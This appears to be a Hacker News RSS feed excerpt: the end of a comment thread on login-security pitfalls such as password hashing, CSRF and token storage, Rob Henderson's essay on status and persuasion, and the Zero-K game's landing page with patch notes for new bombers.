      <center><a id="up_38331735" href="https://news.ycombinator.com/vote?id=38331735&amp;how=up&amp;goto=item%3Fid%3D38331501"></a></center>    </td><td><p><span>Huh, I always forget a lot of programmers weren't around when this stuff was invented. It's all actually pretty simple, and very little complexity. However, there are so many "gotchas" (that can result in zero security) that anyone writing a guide like this would probably have you sign a waiver, then any company you work for sign a waiver, and include your firstborn child.<p>For example, user/pass is pretty simple on the surface:</p><p>1. app sends server user/password.</p><p>2. check if it matches the password in the database.</p><p>3. if so, respond with a token the app can send back that is associated with the user. if not, return with a 401.</p><p>The number of gotchas in this simple 3-step process is insane... here's some off the top of my head (not exhaustive):</p><p>- make sure the login form includes a CSRF token.</p><p>- do not store the password in plaintext in the db. or encrypted, probably. Since an attacker can possibly get the encryption key and then decrypt all your passwords. Use strong, slow hashes.</p><p>- rate limit your logins to prevent brute-forcing (slow hashes work great here)</p><p>- use constant-time comparisons to check if the password matches (e.g., hash_equals() in PHP), RTFM for whatever constant time check you are using or you will open yourself up to timing attacks.</p><p>That's the issue with security stuff, there are so many gotchas that anyone writing a course would open themselves up to getting sued (at least in the US) just for missing a gotcha or someone with Dunning-Kruger thinking they know everything and getting hacked ... it's too risky. You have to just get into the industry and learn it the hard way. At least that's how I learned everything I learned.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                <tr id="38331830"><td></td></tr>
                <tr id="38331900"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_38331900" href="https://news.ycombinator.com/vote?id=38331900&amp;how=up&amp;goto=item%3Fid%3D38331501"></a></center>    </td><td><br><div>
                  <p><span>I'm having to deal with this stuff right now. Firebase stores their refresh token in local storage and that allows minting new session tokens once they expire, are they wrong? Is there any other way to remain signed in "forever"? (until logout or until token is revoked)</span></p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="38332253"><td></td></tr>
                <tr id="38332490"><td><table>  <tbody><tr>    <td indent="4"><img src="https://news.ycombinator.com/s.gif" height="1" width="160"></td><td>
      <center><a id="up_38332490" href="https://news.ycombinator.com/vote?id=38332490&amp;how=up&amp;goto=item%3Fid%3D38331501"></a></center>    </td><td><br><div>
                  <p><span>That is what I'm using but I have to authenticate again every few days. If I used the client library it would autorefresh the token periodically, but that stores the refresh token in local storage. Since that is something you recommend against, I was wondering why.</span></p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="38332759"><td></td></tr>
                                    <tr id="38331839"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_38331839" href="https://news.ycombinator.com/vote?id=38331839&amp;how=up&amp;goto=item%3Fid%3D38331501"></a></center>    </td><td><p><span>Actually, I think we're doing a huge disservice to our profession as programmers when we call stuff like this "an insane number of gotchas". This is no critique of you or your post specifically, mind you, and I know where you're coming from. But it's a critique of a general tendency among programmers to call anything that requires a bit of knowledge and thought beyond the simplest surface level solution "complex" or "insane to implement on your own". It's not. While I know that you're list of gotchas isn't exhaustive, the real list is not so much longer that it's not perfectly reasonable to expect someone to be able to implement it correctly.<p>I say that as someone who was on the "receiving end" of this kind of advice for years btw. I always thought that the things that are "better left to libraries" are really arcane and impossible to understand, which only lead to confusion and an inability to truly assess options. And it's really just a matter of semantics and framing. It would be perfectly reasonable to say "it's not complex as long as you keep this reasonably long list of gotchas in mind".
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                <tr id="38332344"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_38332344" href="https://news.ycombinator.com/vote?id=38332344&amp;how=up&amp;goto=item%3Fid%3D38331501"></a></center>    </td><td><p><span>I don't know why you're getting downvoted (I have no idea why people are on HN if they think this is just Reddit. If you downvote, say why and start a discussion), but you're right. My intent wasn't to imply "just don't do it" or "leave it to libraries." I was trying to say why you can't really find a guide like the post is asking for (at least for free!) and it likely has a lot to do with liability and things like that.<p>I was trying to say exactly what you are saying, and that is just get in there and learn. It isn't that complex to implement this stuff yourself if you need to. I've implemented this stuff myself dozens of times over the years... but I try to use a library before implementing it myself. Interestingly, over the years, I've reviewed libraries and found bugs in them. So, do read the code of the library you're using. Once you've reviewed a few of them (and implemented it yourself a few times), you kinda get an idea of what to look for.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                        </tbody></table>
  </td></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Why dumb ideas capture smart and successful people (133 pts)]]></title>
            <link>https://www.robkhenderson.com/p/how-dumb-ideas-capture-smart-and</link>
            <guid>38331493</guid>
            <pubDate>Sun, 19 Nov 2023 11:05:45 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.robkhenderson.com/p/how-dumb-ideas-capture-smart-and">https://www.robkhenderson.com/p/how-dumb-ideas-capture-smart-and</a>, See on <a href="https://news.ycombinator.com/item?id=38331493">Hacker News</a></p>
<div id="readability-page-1" class="page"><div dir="auto"><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2738bcaa-d0b4-4008-93af-9cf9eb817331_1732x1732.jpeg" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2738bcaa-d0b4-4008-93af-9cf9eb817331_1732x1732.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2738bcaa-d0b4-4008-93af-9cf9eb817331_1732x1732.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2738bcaa-d0b4-4008-93af-9cf9eb817331_1732x1732.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2738bcaa-d0b4-4008-93af-9cf9eb817331_1732x1732.jpeg 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2738bcaa-d0b4-4008-93af-9cf9eb817331_1732x1732.jpeg" width="451" height="451" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/2738bcaa-d0b4-4008-93af-9cf9eb817331_1732x1732.jpeg&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:1456,&quot;width&quot;:1456,&quot;resizeWidth&quot;:451,&quot;bytes&quot;:1722125,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:true,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2738bcaa-d0b4-4008-93af-9cf9eb817331_1732x1732.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2738bcaa-d0b4-4008-93af-9cf9eb817331_1732x1732.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2738bcaa-d0b4-4008-93af-9cf9eb817331_1732x1732.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2738bcaa-d0b4-4008-93af-9cf9eb817331_1732x1732.jpeg 1456w" sizes="100vw" fetchpriority="high"></picture></div></a></figure></div><p data-attrs="{&quot;url&quot;:&quot;https://www.robkhenderson.com/p/how-dumb-ideas-capture-smart-and?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share&quot;,&quot;text&quot;:&quot;Share&quot;,&quot;action&quot;:null,&quot;class&quot;:null}" data-component-name="ButtonCreateButton"><a href="https://www.robkhenderson.com/p/how-dumb-ideas-capture-smart-and?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share" rel=""><span>Share</span></a></p><p data-attrs="{&quot;url&quot;:&quot;https://www.robkhenderson.com/subscribe?&amp;gift=true&quot;,&quot;text&quot;:&quot;Give a gift subscription&quot;,&quot;action&quot;:null,&quot;class&quot;:null}" data-component-name="ButtonCreateButton"><a href="https://www.robkhenderson.com/subscribe?&amp;gift=true" rel=""><span>Give a gift subscription</span></a></p><p>Many have discovered an argument hack. They don’t need to argue that something is false. They just need to show that it’s associated with low status. The converse is also true: You don’t need to argue that something is true. You just need to show that it’s associated with high status. And when low status people express the truth, it sometimes becomes high status to lie.</p><p><span>In the 1980s, the psychologists Richard E. Petty and John T. Cacioppo </span><a href="https://www.springer.com/gp/book/9781461293781?ref=quillette.com" rel="">developed</a><span> the “Elaboration Likelihood Model” to describe how persuasion works. “Elaboration” here means the extent to which a person carefully thinks about the information. When people’s motivation and ability to engage in careful thinking is present, the “elaboration likelihood” is high. This means people are likely to pay attention to the relevant information and draw conclusions based on the merits of the arguments or the message. When elaboration likelihood is high, a person is willing to expend their cognitive resources to update their views.</span></p><p>The idea is that there are two paths, or two “routes,” to persuading others. The first type, termed the “central” route, comes from careful and thoughtful consideration of the messages we hear. When the central route is engaged, we actively evaluate the information presented, and try to discern whether or not it’s true.</p><p>When the “peripheral” route is engaged, we pay more attention to cues apart from the actual information or content or the message. For example, we might evaluate someone’s argument based on how attractive they are or where they were educated, without considering the actual merits of their message.</p><p>When we accept a message through the peripheral route, we tend to be more passive than when we accept a message through the central route. Unfortunately, the peripheral route is more prevalent because we are exposed to an increasingly large amount of information.</p><p><span>The renowned psychologists Susan Fiske and Shelley Taylor have characterized humans as “cognitive misers.” They </span><a href="https://archive.org/details/socialcognition0002fisk" rel="">write</a><span>, “People are limited in their capacity to process information, so they take shortcuts whenever they can.”</span></p><p>We are lazy creatures who try to expend as little mental energy as possible.</p><p>And people are typically less motivated to scrutinize a message if the source is considered to be an expert. We interpret the message through the peripheral route.</p><p><span>This is one reason why media outlets often appoint experts who mirror their political values. These experts lend credibility to the views the outlet espouses. Interestingly, though, expertise appears to influence persuasion only if the individual is identified as an expert </span><em>before</em><span> they communicate their message. </span><a href="https://www.scholars.northwestern.edu/en/publications/the-persuasive-effects-of-delaying-identification-of-high-and-low?ref=quillette.com" rel="">Research</a><span> has found that when a person is told the source is an expert </span><em>after</em><span> listening to the message, this new information does not increase the person’s likelihood of believing the message.</span></p><p><span>It works the other way, too. If a person is told that a source is not an expert </span><em>before</em><span> the message, the person tends to be more skeptical of the message. If told the source is not an expert </span><em>after</em><span> the message, this has no effect on a person’s likelihood of believing the message.</span></p><p>This suggests that knowing a source is an expert reduces our motivation to engage in central processing. We let our guards down.</p><p>As motivation and/or ability to process arguments is decreased, peripheral cues become more important for persuasion. Which might not bode well.</p><p>However, when we update our beliefs by weighing the actual merits of an argument (central route), our updated beliefs tend to endure and are more robust against counterpersuasion, compared to when we update our beliefs through peripheral processing. If we come to believe something through careful and thoughtful consideration, that belief is more resilient to change.</p><p>This means we can be more easily manipulated through the peripheral route. If we are convinced of something via the peripheral route, a manipulator will be more successful at using the peripheral route once again to alter our initial belief.</p><p>But why does this matter? Because by understanding how and why we come to hold our beliefs, we can better understand ourselves and guard against manipulation.</p><p>The founders of the elaboration likelihood model wrote that, “Ultimately, we suspect that attitudes are seen as correct or proper to the extent that they are viewed as beneficial for the physical or psychological well-being of the person.”</p><p><span>In his book </span><em>The Social Leap</em><span>, the evolutionary psychologist William von Hippel writes, “a substantial reason we evolved such large brains is to navigate our social world… A great deal of the value that exists in the social world is created by consensus rather than discovered in an objective sense… our cognitive machinery evolved to be only partially constrained by objective reality.” Our social brains process information not only by examining the facts, but also considering the social consequences of what happens to our reputations if we believe something.</span></p><p>Indeed, in his influential theory of social comparison processes, the eminent psychologist Leon Festinger suggested that people evaluate the “correctness” of their opinions by comparing them to the opinions of others. When we see others hold the same beliefs as us, our own confidence in those beliefs increases. Which is one reason why people are more likely to proselytize beliefs that cannot be verified through empirical means.</p><p>In short, people have a mechanism in their minds. It stops them from saying something that could lower their status, even if it’s true. And it propels them to say something that could increase their status, even if it’s false. Sometimes, local norms can push against this tendency. Certain communities (e.g., scientists) can obtain status among their peers for expressing truths. But if the norm is relaxed, people might default to seeking status over truth if status confers the greater reward.</p><p>Furthermore, knowing that we could lose status if we don’t believe in something causes us to be more likely to believe in it to guard against that loss. Considerations of what happens to our own reputation guides our beliefs, leading us to adopt a popular view to preserve or enhance our social positions. We implicitly ask ourselves, “What are the social consequences of holding (or not holding) this belief?”</p><p><span>But our reputation isn’t the only thing that matters when considering what to believe. Equally important is the reputation of others. Returning to the peripheral route of persuasion, we decide whether to believe something not only if </span><em>lots</em><span> of people believe it, but also if the proponent of the belief is a prestigious person. If lots of people believe something, our likelihood of believing it increases. And if a high-status person believes something, we are more prone to believing it, too.</span></p><p><span>This starts when we are children. In her recent book </span><em>Cognitive Gadgets</em><span>, the Oxford psychologist Cecilia Hayes writes, “children show prestige bias; they are more likely to copy a model that adults regard as being higher social status- for example, their head-teacher rather than an equally familiar person of the same age and gender.” Hayes cites a 2013 </span><a href="https://www.sciencedirect.com/science/article/pii/S0022096513000982?casa_token=ZQfNgYFnvxsAAAAA%3AqgqHTEcD5VbklYgiS-byzHdKJ9MF7FvafyL_kysopRyVRQz85WlcU81A4CbpXf1wqV8Dcjvhkg&amp;ref=quillette.com#!" rel="">study</a><span> by Nicola McGuigan who found that five-year-old children are “selective copiers.” Results showed that kids were more likely to imitate their head-teacher rather than an equally familiar person of the same age and gender. Young children are more likely to imitate a person that adults regard as being higher status.</span></p><p>People in general favor mimicking prestigious people compared to ordinary people. This is why elites have an outsized effect on culture, and why it is important to scrutinize their ideas and opinions. As a descriptive observation, the opinions of my friend who works at McDonald’s have less effect on society than the opinions of my friend who works at McKinsey. If you have any kind of prominence, you unavoidably become a model that others, including children, are more likely to emulate.</p><p><span>Indeed, the Canadian anthropologist Jerome Barkow </span><a href="https://link.springer.com/chapter/10.1007/978-1-4939-0867-7_2?ref=quillette.com" rel="">posits</a><span> that people across the world view media figures as more prestigious than respected members of their local communities. People on screen appear to be attractive, wealthy, popular, and powerful. Barkow writes, “All over the world, children are learning not from members of their own community but from media figures whom they perceive as prestigious… local prestige is debased.” As this phenomenon continues to grow, the opinions and actions of the globally-prestigious carry even more influence.</span></p><p>Of course, people don’t copy others with high-status solely because they hope that mimicking them will boost their own status. We tend to believe that prestigious people are more competent; prominence is a heuristic for skill.</p><p><span>In a recent </span><a href="https://www.nature.com/articles/s41599-019-0228-7?ref=quillette.com" rel="">paper</a><span> about prestige-based social learning, researchers Ángel V. Jiménez and Alex Mesoudi wrote that assessing competence directly “may be noisy and costly. Instead, social learners can use short-cuts either by making inferences from the appearance, personality, material possessions, etc. of the models.”</span></p><p>For instance, a military friend of mine used to be a tutor for rich high school students. He himself is not as wealthy as them, and disclosed to me that he paid $200 to replace his old earphones for AirPods. This was so that the kids and their families would believe he is in the same social position as them, and therefore qualified to teach.</p><p>Which brings us to a question: Who is most susceptible to manipulation via peripheral persuasion? It might seem intuitive to believe that people with less education are more manipulable. But research suggests this may not be true.</p><p>High-status people are more preoccupied with how others view them. Which means that educated and/or affluent people may be especially prone to peripheral, as opposed to central, methods of persuasion.</p><p><span>Indeed, the psychology professor Keith Stanovich, discussing his research on “myside bias,” has </span><a href="https://quillette.com/2020/09/26/the-bias-that-divides-us/" rel="">written</a><span>, “if you are a person of high intelligence… you will be less likely than the average person to realize you have derived your beliefs from the social groups you belong to and because they fit with your temperament and your innate psychological propensities.”</span></p><p>Students and graduates of top universities are more prone to myside bias. They are more likely to “evaluate evidence, generate evidence, and test hypotheses in a manner biased toward their own prior beliefs, opinions, and attitudes.”</p><p><span>This is not unique to our own time. William Shirer, the American journalist and author of </span><em>The Rise and Fall of the Third Reich</em><span>, described his experiences as a war correspondent in Nazi Germany. Shirer wrote, “Often in a German home or office or sometimes in a casual conversation with a stranger in a restaurant, beer hall, or café, I would meet with outlandish assertions from seemingly educated and intelligent persons. It was obvious they were parroting nonsense they heard on the radio or read in the newspapers. Sometimes one was tempted to say as much, but one was met with such incredulity, as if one had blasphemed the Almighty.”</span></p><p><span>Likewise, in a fascinating </span><a href="https://www.jstor.org/stable/40870502?seq=1&amp;ref=quillette.com#metadata_info_tab_contents" rel="">study</a><span> on the collapse of the Soviet Union, researchers have found that university-educated people were two to three times more likely than high school graduates to say they supported the Communist Party. White-collar professional workers were likewise two to three times more supportive of communist ideology, relative to farm laborers and semi-skilled workers.</span></p><p><span>Educational divides within the US today are consistent with these historical patterns. The Democratic political analyst David Shor has </span><a href="https://nymag.com/intelligencer/2021/03/david-shor-2020-democrats-autopsy-hispanic-vote-midterms-trump-gop.html?ref=quillette.com" rel="">observed that</a><span>, “Highly educated people tend to have more ideologically coherent and extreme views than working-class ones. We see this in issue polling and ideological self-identification. College-educated voters are way less likely to identify as moderate.”</span></p><p><span>One possibility for this is that regardless of time or place, affluent members of society are more likely to say the right things to either preserve status or gain more of it. A series of studies by researchers at the University of Queensland </span><a href="https://onlinelibrary.wiley.com/doi/full/10.1002/ejsp.2620?ref=quillette.com" rel="">found</a><span> that, “relative to lower-class individuals, upper-class individuals have a greater desire for wealth and status… it is those who have more to start with (i.e., upper-class individuals) who also strive to acquire more wealth and status.”</span></p><p><span>A more recent set of </span><a href="https://journals.sagepub.com/doi/abs/10.1177/0146167220937544?ref=quillette.com" rel="">studies</a><span> led by Cameron Anderson at the University of Berkeley found that social class, measured in terms of education and income, was positively associated with the desire for social status. People who had more education and money were more likely to agree with statements like “I enjoy having influence over other people’s decision making” and “It would please me to have a position of prestige and social standing.”</span></p><p><span>Who feels most in danger of losing their reputations, though? Turns out, those same exact people. A </span><a href="https://www.cato.org/sites/cato.org/files/2020-07/Crosstabs_Political%20Climate_0.pdf?ref=quillette.com" rel="">survey</a><span> by the Cato Institute in collaboration with YouGov asked a nationally representative sample of 2,000 Americans various questions about self-censorship.</span></p><p>They found that highly educated people are the most concerned about losing their jobs or missing out on job opportunities because of their political views. Twenty-five percent of those with a high school education or less are afraid of getting fired or hurting their employment prospects because of their political views, compared with 34 percent of college graduates and an astounding 44 percent of people with a postgraduate degree.</p><p><span>Results from a recent </span><a href="https://papers.ssrn.com/sol3/papers.cfm?abstract_id=3647099&amp;ref=quillette.com" rel="">paper</a><span> titled ‘Keeping Your Mouth Shut: Spiraling Self-Censorship in the United States’ by the political scientists James L. Gibson and Joseph L. Sutherland is consistent with the findings from Cato/Yougov. They find that self-censorship has skyrocketed. In the 1950s, at the height of McCarthyism, 13.4 percent of Americans reported that “felt less free to speak their mind than they used to.” In 1987, the figure had reached 20 percent. By 2019, 40 percent of Americans reported that they did not feel free to speak their minds. This isn’t a partisan issue, either. Gibson and Sutherland report that, “The percentage of Democrats who are worried about speaking their mind is just about identical to the percentage of Republicans who self-censor: 39 and 40 percent, respectively.”</span></p><p>The increase is especially pronounced among the educated class. The researchers report, “It is also noteworthy and perhaps unexpected that those who engage in self-censorship are not those with limited political resources… self-censorship is most common among those with the highest levels of education… This finding suggests a social learning process, with those with more education being more cognizant of social norms that discourage the expression of one’s views.”</p><p>Highly-educated people appear to be the most likely to express things they don’t necessarily believe for fear of losing their jobs or their reputation. Within the upper class, the true believers set the pace, and those who are loss-averse about their social positions go along with it.</p><p><span>Interestingly, there is suggestive </span><a href="https://psycnet.apa.org/doiLanding?doi=10.1037%2Fa0028756&amp;ref=quillette.com" rel="">evidence</a><span> indicating that education is </span><em>negatively </em><span>associated with one’s sense of power. That is, the more education someone has, the more likely they are to agree with statements like, “Even if I voice them, my views have little sway” and “My ideas and opinions are often ignored.” Granted, the correlation is quite small (r = -.15). Still, the finding is significant and in the opposite direction of what most people would expect.</span></p><p><span>Research by Caitlin Drummond and Baruch Fischhoff at Carnegie Mellon University </span><a href="https://www.pnas.org/content/114/36/9587?ref=quillette.com" rel="">found</a><span> that people with more education, science education, and science literacy are more polarized in their views about scientific issues depending on their political identity. For example, the people who are most concerned about climate change? College-educated Democrats. The people who are least concerned? College-educated Republicans. In contrast, less educated Democrats and Republicans are not so different from one another in their views about climate change.</span></p><p><span>Likewise, in an article titled “Academic and Political Elitism,” the sociologist Musa Al-Gharbi has summarized related research, </span><a href="https://www.insidehighered.com/views/2019/08/27/academe-should-avoid-politicizing-educational-attainment-opinion?ref=quillette.com" rel="">writing</a><span>, “compared to the general public, cognitively sophisticated voters are much more likely to form their positions on issues based on partisan cues of what they are ‘supposed’ to think in virtue of their identity as Democrats, Republicans, etc.”</span></p><p>It’s also useful to understand how highly educated people view others and their social relationships. Consider a paper titled ‘Seeing the Best or Worst in Others: A Measure of Generalized Other-Perceptions’ led by Richard Rau at the University of Münster. Rau and his colleagues were interested in how various factors influence people’s perceptions of others.</p><p>In the study, participants looked at social network profiles of people they did not know. They also viewed short video sequences of unfamiliar people describing a neutral personal experience like traveling to work. Researchers then asked participants to evaluate the people in the social media profiles and videos. Participants were asked how much they agreed with statements like “I like this person,” and “This person is cold-hearted.” Then participants responded to various demographic and personality questions about themselves.</p><p>Some findings weren’t so surprising. The researchers found, for example, that people who scored highly on the personality traits of openness and agreeableness tended to hold more favorable views of others.</p><p><span>More sobering, though, is that higher education was consistently related to </span><em>less positive</em><span> views of other people. In their paper they write, “to understand people’s feelings, behaviors, and social relationships, it is of key importance to know which general view they hold about others… the better people are educated, the less positive their other-perceptions are.”</span></p><p>So affluent people care the most about status, believe they have little power, are afraid of losing their jobs and reputation, and have less favorable views of others.</p><p>In short, opinions can confer status regardless of their truth value. And the individuals most likely to express certain opinions in order to preserve or enhance their status are also those who are already on the upper rungs of the social ladder.</p><p>There may be unpleasant consequences for this misguided use of intellect and time on the part of highly educated and affluent people. If the most fortunate members of society spend more time speaking in hushed tones, or live in fear of expressing themselves, or are more involved in culture wars, that is less time they could spend using their mental and economic resources to solve serious problems.</p><p>Smart people are usually better at finding the truth. But they’re also better at knowing which way the ideological winds are blowing, and thereby producing and accepting absurdities. </p><p><span>A version of this essay was </span><a href="https://quillette.com/2021/04/03/persuasion-and-the-prestige-paradox-are-high-status-people-more-likely-to-lie/" rel="">originally</a><span> published in </span><em>Quillette. </em></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Zero-k: A libre sci-fi RTS game, with an economy based on metal and energy (263 pts)]]></title>
            <link>https://zero-k.info/</link>
            <guid>38331349</guid>
            <pubDate>Sun, 19 Nov 2023 10:43:09 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://zero-k.info/">https://zero-k.info/</a>, See on <a href="https://news.ycombinator.com/item?id=38331349">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="features">
            <div>
                    
                <br>
                <iframe width="560" height="315" src="https://www.youtube.com/embed/pHQkctGTm_A?rel=0" frameborder="0" hd="1" allowfullscreen=""></iframe>
                
                <div>
                    <h3>Commander wanted!</h3> <p>Drive giant robots, build an army of a thousand Fleas, move mountains if needed, bury the enemy at all cost!</p>
                    <ul><li>Real time strategy.</li><li>Physically simulated units and projectiles.</li><li>Terrain manipulation.</li><li>100+ varied units with unique abilities.</li><li>Singleplayer campaign.</li><li>Challenging, non-cheating AI.</li><li>Multiplayer 1v1 - 16v16, FFA, coop.</li><li>Multiplayer online campaign.</li><li>Really free, no in-game currency, no unfair multiplayer.</li></ul>
                    
                    
                    <h3>Fully Utilized Physics</h3>
                    <p>Simulated unit and projectile physics is used to a level rarely found in a strategy game.</p>
                    <p><img src="https://zero-k.info/img/landing/text1.jpg"><br></p>
                    <ul><li>Use small nimble units to dodge slow moving projectiles.</li><li>Hide behind hills that block weapon fire, line of sight and radar.</li><li>Toss units across the map with gravity guns.</li><li>Transport a battleship to a hilltop - for greater views and gun range.</li></ul>
                    
                    
                    <h3>Manipulate the Terrain</h3>
                    <p>The terrain itself is an ever-changing part of the battlefield.</p>
                    <h3><img src="https://zero-k.info/img/landing/text2.jpg"></h3>
                    <ul><li>Wreck the battlefield with craters that bog down enemy tanks.</li><li>Dig canals to bring your navy inland for a submarine-in-a-desert strike.</li><li>Build ramps, bridges, entire fortress if you wish.</li><li>Burn your portrait into continental crust using the planetary energy chisel.</li></ul>
                    
                    
                    <h3>Singleplayer Campaign and Challenging AI</h3>
                    <p>Enjoy many hours of single player and coop fun with our campaign, wide selection of non-cheating AIs and a survival mode against an alien horde.<br></p>
                    <p><img src="https://zero-k.info/img/landing/text3.jpg"></p><ul><li>Explore the galaxy and discover technologies in our singleplayer campaign.</li><li>Face a challenging AI that is neither brain-dead nor a clairvoyant cheater.</li><li>Have some coop fun with friends, surviving waves of chicken-monsters.</li><li>Cloaking? Resurrection? Tough choices customizing your commander.</li></ul>
                    
                    
                    <h3>Casual and Competitive Multiplayer</h3>
                    <p>Zero-K was built for multiplayer from the start, this is where you can end up being hooked for a decade.</p>
                    <h3><img src="https://zero-k.info/img/landing/text4.jpg"></h3>
                    <ul><li>Enjoying epic scale combat? Join our 16v16 team battles!</li><li>Looking for a common goal? Fight AIs or waves of chicken-monsters.</li><li>Prefer dancing on a razor's edge? Play 1v1 in ladder and tournaments.</li><li>Comebacks, betrayals, emotions always running high in FFA.</li><li>Want to fight for a bigger cause? Form a clan and join <strong>PlanetWars</strong>, competitive online campaign with web-game strategic elements, diplomacy and backstabbing.</li></ul>
                    
                    
                    <h3>Power to the People</h3>
                    <p>We are RTS players at heart, we work for nobody. We gave ourselves the tools we always wanted to have in a game.</p>
                    <p><img src="https://zero-k.info/img/landing/text5.jpg"><br></p>
                    <ul><li>Do what you want. No limits to camera, queue or level of control.</li><li>Paint a shape, any shape, and units will move to assume your formation.</li><li>Want to spend more time on tactics? Use construction priorities.</li><li>Want to focus on economy? Order units to kite, strafe or zig zag bullets.</li></ul>
                    
                    
                    <h3>Plenty of Stuff to <del>Explode</del> Explore</h3>
                    <p>Zero-K is a long term project and it shows, millions hours of proper multiplayer testing and dozens of people contributing ever expanding content.</p>
                    <p><img src="https://zero-k.info/img/landing/text6.jpg"><br></p>
                    <ul><li>Learn to use all of our 100+ units and play on hundreds of maps.</li><li>Invent the next mad team-tactics to shock enemies and make allies laugh.</li><li>Combine cloaking, teleports, shields, jumpjets, EMP, napalm, gravity guns, black hole launchers, mind control and self-replication.</li><li>Tiny flea swarm that clings to walls? <br>Jumping "cans" with steam-spike? <br>Buoys that hide under water to ambush ships? <br>Mechs that spew fire and enjoy being tossed from air transports? <br>Carrier with cute helicopters? <br>Jumping Jugglenaut with dual wielding gravity guns? <br>Meet them in Zero-K!<span></span></li></ul>
                </div><br>
                    
                
            </div><br>
    </div><div id="news">
            <h2>Zero-K v1.11.11.1 - Odin's Magpies</h2>
                <p><a href="https://zero-k.info/img/news/3350.png"><img src="https://zero-k.info/img/news/3350_thumb.png"></a></p><div><p>This update introduces two new bombers to fill out the aircraft roster. One is a bit like a light Likho, and another is like a heavy Raven, but there is a lot more to each. Other planes have tweaks and buffs, such as an area reveal ability for Sparrow, and a heavier Phoenix. Some gunships even got in on the action, with the most notable being a sizeable buff for Krow.</p><p>Other balance changes include a bit more health for light assaults, and better spinning for Disco Rave Party. In terms of features, bombers are well-served here as well, with selection icons for whether a bomber needs ammo, as well as smoother landing paths.</p><p>There are a few extra features for modding, such as scaling and tinting, which were technically in the previous hotfix. The campaign has the new bombers, a few features, and a new Records page which displays and aggregates your best stats for each mission. How fast can the campaign be completed, and with how few units lost?</p><h2><a name="New_Bombers"></a>New Bombers</h2><p><strong>Magpie</strong> is a light nimble bomber armed with a pair of missiles. It deals less damage than Raven, but makes up for it with speed, precision, and the ability to shoot from the edge of AA coverage.</p><ul>
<li>
Cost 220</li>
<li>
Health 900</li>
<li>
Speed 252 (between Raven and Likho)</li>
<li>
Rearm time 20s</li>
<li>
Range 550</li>
<li>
Damage 180 x 2</li>
<li>
Can hit small raiders most of the time, and most aircraft.</li>
</ul>
<p><strong>Odin</strong> is a heavily armoured rocket zeppelin that can fire a slow moving disintegrator bomb or a cluster of temporary shields.</p><ul>
<li>
Cost 1500</li>
<li>
Health 5200</li>
<li>
Speed 185 (between Raptor and most gunships)</li>
<li>
Rearm time 35s</li>
<li>
Bomb range 200</li>
<li>
Bomb damage, it's a disintegrator (5-shots Detriment)</li>
<li>
The bomb is very slow, even Detriment can dodge it.</li>
<li>
Special weapon fires seven shields at 550 range.</li>
<li>
Each shield has 3400 charge and a radius of 200.</li>
<li>
Shields decay at 40 charge/s, expire at zero charge, and do not link.</li>
</ul>
<h2><a name="Aircraft_Changes"></a>Aircraft Changes</h2><p><strong>Sparrow</strong> can now boost, and reveals and decloaks everything in an area when it dies.</p><ul>
<li>
Boosts by 5x for 3 seconds.</li>
<li>
Destroys itself after boost.</li>
<li>
Reveals an area of radius 400 for 12 seconds when it dies.</li>
<li>
Revealed area scales up during boost, to a maximum of 640.</li>
</ul>
